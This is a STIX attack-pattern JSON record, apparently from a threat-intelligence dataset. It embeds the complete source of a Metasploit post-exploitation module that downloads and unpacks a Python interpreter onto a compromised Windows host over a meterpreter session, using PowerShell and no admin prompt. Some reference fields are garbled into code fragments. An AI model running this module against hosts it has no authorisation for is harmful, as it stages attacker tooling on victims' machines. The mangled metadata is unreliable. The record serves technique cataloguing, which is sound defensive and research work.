{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4921e841-b841-4f0c-bce8-c4af7e207a64",
    "created": "2024-08-14T16:33:04.994892Z",
    "modified": "2024-08-14T16:33:04.994896Z",
    "name": "Install Python for Windows",
    "description": " This module places an embeddable Python3 distribution onto the target file system granting pentesters access to a lightweight Python interpreter. This module does not require administrative privileges or user interaction with installation prompts.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/install_python.rb",
            "external_id": "install_python.rb"
        },
        {
            "source_name": "reference",
            "url": "https://docs.python.org/3/using/windows.html#windows-embeddable"
        },
        {
            "source_name": "reference",
            "url": "https://attack.mitre.org/techniques/T1064/"
        },
        {
            "source_name": "fail_with(Failure::NotFound",
            "external_id": "\"Failedtodownload#{datastorePYTHON_URL}\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Windows::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Install Python for Windows',\n        'Description' => %q{\n          This module places an embeddable Python3 distribution onto the target file system,\n          granting pentesters access to a lightweight Python interpreter.\n          This module does not require administrative privileges or user interaction with\n          installation prompts.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Michael Long <bluesentinel[at]protonmail.com>'],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter'],\n        'References'\t=> [\n          ['URL', 'https://docs.python.org/3/using/windows.html#windows-embeddable'],\n          ['URL', 'https://attack.mitre.org/techniques/T1064/']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('PYTHON_VERSION', [true, 'Python version to download', '3.8.2']),\n        OptString.new('PYTHON_URL', [true, 'URL to Python distributions', 'https://www.python.org/ftp/python/']),\n        OptString.new('FILE_PATH', [true, 'File path to store the python zip file; current directory by default', '.\\\\python-3.8.2-embed-win32.zip']),\n        OptBool.new('CLEANUP', [false, 'Remove module artifacts; set to true when ready to cleanup', false])\n      ]\n    )\n  end\n\n  def run\n    python_folder_path = File.basename(datastore['FILE_PATH'], File.extname(datastore['FILE_PATH']))\n    python_exe_path = \"#{python_folder_path}\\\\python.exe\"\n    python_url = \"#{datastore['PYTHON_URL']}#{datastore['PYTHON_VERSION']}/python-#{datastore['PYTHON_VERSION']}-embed-win32.zip\"\n\n    # check if PowerShell is available\n    psh_path = '\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'\n    unless file? \"%WINDIR%\\\\System32#{psh_path}\"\n      fail_with(Failure::NotVulnerable, 'No powershell available.')\n    end\n\n    # Cleanup module artifacts\n    if datastore['CLEANUP']\n      print_status('Removing module artifacts')\n      script = 'Stop-Process -Name \"python\" -Force; '\n      script << \"Remove-Item -Force #{datastore['FILE_PATH']}; \"\n      script << \"Remove-Item -Force -Recurse #{python_folder_path}; \"\n      psh_exec(script)\n      return\n    end\n\n    # download python embeddable zip file\n    script = '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;'\n    script << \"Invoke-WebRequest -Uri #{python_url} -OutFile #{datastore['FILE_PATH']}; \"\n    print_status(\"Downloading Python embeddable zip from #{python_url}\")\n    psh_exec(script)\n\n    # confirm python zip file is present\n    unless file? datastore['FILE_PATH']\n      fail_with(Failure::NotFound, \"Failed to download #{datastore['PYTHON_URL']}\")\n    end\n\n    # extract python embeddable zip file\n    script = \"Expand-Archive #{datastore['FILE_PATH']}; \"\n    print_status(\"Extracting Python zip file: #{datastore['FILE_PATH']}\")\n    psh_exec(script)\n\n    # confirm python.exe is present\n    unless file? python_exe_path\n      fail_with(Failure::NotFound, python_exe_path)\n    end\n\n    # display location of python interpreter with example command\n    print_status('Ready to execute Python; spawn a command shell and enter:')\n    print_good(\"#{python_exe_path} -c \\\"print('Hello, world!')\\\"\")\n    print_warning('Avoid using this python.exe interactively, as it will likely hang your terminal; use script files or 1 liners instead')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}